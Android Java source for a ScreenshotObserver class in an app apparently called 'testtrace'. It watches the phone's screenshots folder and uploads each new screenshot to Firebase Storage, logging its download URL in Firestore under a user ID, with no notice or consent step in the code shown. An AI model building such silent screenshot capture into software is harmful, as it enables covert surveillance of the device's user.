package com.reiserx.testtrace.Screenshot;

import android.net.Uri;
import android.os.Environment;
import android.os.FileObserver;
import android.util.Log;

import com.google.firebase.firestore.DocumentReference;
import com.google.firebase.firestore.FirebaseFirestore;
import com.google.firebase.storage.FirebaseStorage;
import com.google.firebase.storage.StorageReference;
import com.reiserx.testtrace.Models.downloadUrl;

import java.io.File;
import java.util.Calendar;

public class ScreenshotObserver {

    String TAG = "ScreenshotOberver";

    public void Observer (String UserID) {
        String path;
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.Q) {
            path = Environment.getExternalStorageDirectory() + File.separator + Environment.DIRECTORY_DCIM + File.separator + Environment.DIRECTORY_SCREENSHOTS;
        } else {
            path = Environment.getExternalStorageDirectory() + File.separator + Environment.DIRECTORY_DCIM + File.separator + "Sceenshots";
        }
        Log.d(TAG, path);

        String finalPath = path;
        FileObserver fileObserver = new FileObserver(finalPath, FileObserver.CREATE) {
            @Override
            public void onEvent(int event, String paths) {
                Log.d(TAG, event + " " + paths);
                File file = new File(finalPath +"/"+paths);
                StorageReference reference = FirebaseStorage.getInstance().getReference().child("Main").child(UserID).child("ScreenShots").child(file.getName());
                DocumentReference collectionReference = FirebaseFirestore.getInstance().collection("Main").document(UserID).collection("ScreenShots").document(file.getName());
                reference.putFile(Uri.fromFile(file)).addOnCompleteListener(task -> {
                    Log.d(TAG, "uploading");
                    if (task.isSuccessful()) {
                        reference.getDownloadUrl().addOnSuccessListener(uri -> {
                            Log.d(TAG, "getting url");
                            Calendar cal = Calendar.getInstance();
                            long currentTime = cal.getTimeInMillis();
                            downloadUrl downloadUrl = new downloadUrl(uri.toString(), currentTime);
                            collectionReference.set(downloadUrl).addOnSuccessListener(reference1 -> Log.d(TAG, String.valueOf(reference1)));
                        });
                    } else {
                        Log.d(TAG, task.getException().toString());
                    }
                });
            }
        };

        fileObserver.startWatching();
    }
}
